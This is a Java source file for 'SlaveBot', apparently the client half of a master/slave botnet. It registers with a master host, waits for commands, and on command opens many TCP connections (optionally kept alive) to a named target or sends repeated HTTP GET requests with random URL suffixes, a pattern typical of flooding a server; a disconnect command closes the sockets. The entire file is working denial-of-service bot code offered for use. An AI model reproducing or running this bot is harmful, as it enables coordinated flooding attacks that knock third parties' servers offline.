//package bot;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.Map.Entry;



public class SlaveBot implements Runnable {

	static ServerSocket slavePort;
	static Integer slaveListenPort;
	static Map<String, targetData> targetDataMap = new HashMap <String,targetData> ();
	static class targetData{  
		public String action;
		public String port;                                                                                                  
		public String targetHost; 
		public String numConnections;
		public ArrayList<Socket> arrSoc;

		public targetData(String action, String targetHost, String port, String numConnections) {                                                                           
			this.port = port;                                                                                             
			this.targetHost = targetHost;   
			this.numConnections = numConnections;
			this.action = action;
			this.arrSoc = new ArrayList<Socket>();

		}                                                                                                                 
	}
	public void run() {
		try{
			while(true)
			{
				Socket listener = slavePort.accept();
				PrintWriter out = new PrintWriter(listener.getOutputStream(), true);
				BufferedReader in = new BufferedReader(new InputStreamReader(listener.getInputStream()));
				BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
				String dataFromMaster = in.readLine();
				extractTargetData(dataFromMaster);
			}        
		}
		catch (Exception e){
			System.out.println(e);
		}
	}

	public static void extractTargetData(String targetData){
		String delims = " ";
		StringTokenizer st = new StringTokenizer(targetData, delims);
		Integer numElements = st.countTokens();
		String action = null;
		String targetHostName = null;
		String targetPort = null;
		String numberOfConn = null;
		String keepAliveOrUrl = null;

		if(numElements == 3){
			action  = (String)st.nextElement();
			targetHostName = ((String) st.nextElement());
			targetPort = ((String) st.nextElement());
			numberOfConn = "1";
		}

		else if(numElements == 5){
			action  = (String)st.nextElement();
			targetHostName = ((String) st.nextElement());
			targetPort = ((String) st.nextElement());
			numberOfConn = ((String) st.nextElement());
			keepAliveOrUrl = ((String) st.nextElement());
		}

		else{
			System.out.println("Unknown elements");
		}

		storeTargetData(action, targetHostName, targetPort, numberOfConn, keepAliveOrUrl);
	}

	public static void storeTargetData(String action, String targetHostName, String targetPortNumber, String numberOfConn, String keepAliveOrUrl){


		if (action.contentEquals("connect")){
			String uniqueKey = concatinatedData(targetHostName, targetPortNumber);
			// create an object and insert into the hash table value first time
			targetData targetObj;

			if (targetDataMap.containsKey(uniqueKey) == false)
			{
				targetObj = new targetData(action, targetHostName, targetPortNumber, numberOfConn);
				targetDataMap.put(uniqueKey, targetObj);
			}
			else
			{
				targetObj =  targetDataMap.get(uniqueKey);
			}

			performConnect(targetObj.targetHost, targetObj.port, numberOfConn, keepAliveOrUrl);
		}


		else if (action.contentEquals("disconnect")){

			if (targetPortNumber.equals(null)){

				performDisconnect(targetHostName, null);

			}
			else {
				performDisconnect(targetHostName, targetPortNumber);
			}
		}
	}

	public static String concatinatedData(String ip, String port){
		String concatinate = ip + port;
		return concatinate;
	}

	public static Integer registerSlave(String hostname, Integer masterport){
		Socket client_socket;
		try{
			client_socket = new Socket(hostname, masterport);
			PrintWriter out = new PrintWriter(client_socket.getOutputStream(), true);
			BufferedReader in = new BufferedReader(new InputStreamReader(client_socket.getInputStream()));

			String ip=(((InetSocketAddress) client_socket.getRemoteSocketAddress()).getAddress()).toString().replace("/","");
			Integer slavePort_int = client_socket.getLocalPort();
			String local_host = client_socket.getInetAddress().getHostAddress();
			out.println(ip +","+ slavePort_int + "," + local_host);
			return slavePort_int;

		}
		catch (Exception e){
			System.out.println(e);
			return -1;
		}

	}

	public static void simpleConnect(String conKey, String numConnect, String ip, String port){

		Integer numConnectionInt = Integer.parseInt(numConnect);
		Integer portInt = Integer.parseInt(port);
		targetData obj = targetDataMap.get(conKey);
		if (targetDataMap.containsKey(conKey)){
			try{
				for(int i = 0; i < numConnectionInt; i++){
				InetSocketAddress hostIP = new InetSocketAddress(ip, portInt);
					Socket socObj = new Socket();
					socObj.connect(hostIP);
					obj.arrSoc.add(socObj);
				//	System.out.println("Connected to the target");
				}
			}
			catch(Exception e){
				System.out.println(e);
			}
		}

	}


	public static void performConnect(String ip, String port, String numConnection, String keepAliveOrUrl){
		String conKey = concatinatedData(ip, port);
		Integer numConnectionInt = Integer.parseInt(numConnection);
		if(keepAliveOrUrl.equals("null")){
			simpleConnect(conKey, numConnection, ip, port);
		}

		else{
			Integer portInt = Integer.parseInt(port);
			targetData obj = targetDataMap.get(conKey);
			if(keepAliveOrUrl.contentEquals("keepalive")){
				if (targetDataMap.containsKey(conKey)){
					try{
						for(int i = 0; i < numConnectionInt; i++){
							InetSocketAddress hostIP = new InetSocketAddress(ip, portInt);
								Socket socObj = new Socket();
								socObj.connect(hostIP);
								socObj.setKeepAlive(true);
								obj.arrSoc.add(socObj);
								//System.out.println("Connected to the target keepalive");
						}
					}
					catch(Exception e){
						System.out.println(e);
					}
				}
				else{
					System.out.println("Error Connecting");
				}

			}
			else if(keepAliveOrUrl.startsWith("url=")){
				String actualUrl = keepAliveOrUrl.replaceAll("url=", "");

				if(ip.matches(".*\\d+.*")){
					String halfUrl = ip + ":" + port + actualUrl;
					HttpURLConnection connection = null;
					for(int i = 0; i < numConnectionInt; i++){
						StringBuilder completeUrl = new StringBuilder(halfUrl);
						Random random = new Random();
						char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
						int  randomNum = random.nextInt(10) + 1;
						for (int j = 0; j < randomNum; j++) {
							char toAppend = chars[random.nextInt(chars.length)];
							completeUrl.append(toAppend).toString();
						}
						
						try{
							URL url = new URL("http://" + completeUrl.toString());
							connection = (HttpURLConnection) url.openConnection();
							connection.setRequestMethod("GET");
							//System.out.println("The url to connect is " + completeUrl);
							//int responseCode = connection.getResponseCode();
							//System.out.println("Response Code : " + responseCode);

							
							connection.disconnect();

						} catch (MalformedURLException e) {

							e.printStackTrace();

						} catch (IOException e) {

							e.printStackTrace();

						}
						
					}	
				}

				else{
					String halfUrl = ip+ actualUrl;
					HttpURLConnection connection = null;
					for(int i = 0; i < numConnectionInt; i++){
						StringBuilder completeUrl = new StringBuilder(halfUrl);
						Random random = new Random();
						char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
						int  randomNum = random.nextInt(10) + 1;
						for (int j = 0; j < randomNum; j++) {
							char toAppend = chars[random.nextInt(chars.length)];
							completeUrl.append(toAppend);
						}
						try{
							URL url = new URL("http://" + completeUrl.toString());
							connection = (HttpURLConnection) url.openConnection();
							connection.setRequestMethod("GET");
							//System.out.println("The url to connect is " + url);
							//int responseCode = connection.getResponseCode();
							//System.out.println("Response Code : " + responseCode);
							connection.disconnect();

						} catch (MalformedURLException e) {

							e.printStackTrace();

						} catch (IOException e) {

							e.printStackTrace();

						}
					}
				}
			}
		}
	}



	public static void performDisconnect(String ip, String port) {

		if(port.equals(null)){
			for (Entry<String, targetData> entry : targetDataMap.entrySet()){
				if(entry.getKey().startsWith(ip)){
					targetData newObj = entry.getValue();
					try{
						int length = entry.getValue().arrSoc.size();
						for (int i = 0; i< length; i++){
							Socket deleteSoc = (Socket)entry.getValue().arrSoc.get(i);
							deleteSoc.close();
							entry.getValue().arrSoc.remove(deleteSoc);
						}
					}
					catch(Exception e){
						System.exit(-1);
					}
				}
			}
		}

		else{
			String uniqueKey = concatinatedData(ip, port);
			targetData obj = targetDataMap.get(uniqueKey);
			if (targetDataMap.containsKey(uniqueKey)){
				try{
					int length = obj.arrSoc.size();
					for (int i = 0; i< length; i++){
						Socket deleteSoc = (Socket)obj.arrSoc.get(0);
						deleteSoc.close();
						obj.arrSoc.remove(deleteSoc);
					}
				}
				catch(Exception e){
					//System.out.println("Something went wrong");
				}
			}
		}
	}

	public static void listMap(){
		Iterator<Entry<String, targetData>> iter = targetDataMap.entrySet().iterator();
		while (iter.hasNext()) {
			Entry<String, targetData> entry = iter.next();
			targetData localObj = entry.getValue();
			System.out.print(localObj.targetHost + "\t" + localObj.port + "\t" + localObj.arrSoc.toString()+ "\n");

		}
	}

	public static void main(String[] args) throws Exception {
		if(args.length != 4)
		{
			System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
			System.exit(0);
		}

		String hostname = args[1];
		Integer masterport = Integer.parseInt(args[3]);
		slaveListenPort = registerSlave(hostname, masterport);
		slavePort = new ServerSocket(slaveListenPort);
		new Thread(new SlaveBot()).start();

	}	

}
